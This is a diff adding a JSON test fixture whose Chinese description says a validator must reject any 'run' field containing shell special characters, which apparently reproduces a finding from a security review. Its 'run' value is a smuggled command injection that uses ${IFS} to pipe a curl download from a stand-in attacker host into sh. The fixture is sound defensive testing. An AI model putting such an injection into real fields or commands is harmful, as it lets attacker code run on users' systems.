@@ -1,0 +1,14 @@
+{
+  "schema": "program",
+  "description": "run 會出現在建議的指令裡：帶 shell 特殊字元（;、|、$、${IFS}）的一律報錯（1.0 第二次審查 1 的重現輸入）",
+  "semantic": true,
+  "data": {
+    "epics": [
+      {
+        "id": "auth-sso",
+        "title": "單一登入",
+        "run": "2026-11-01-auth;curl${IFS}-s${IFS}evil.example|sh;#"
+      }
+    ]
+  }
+}
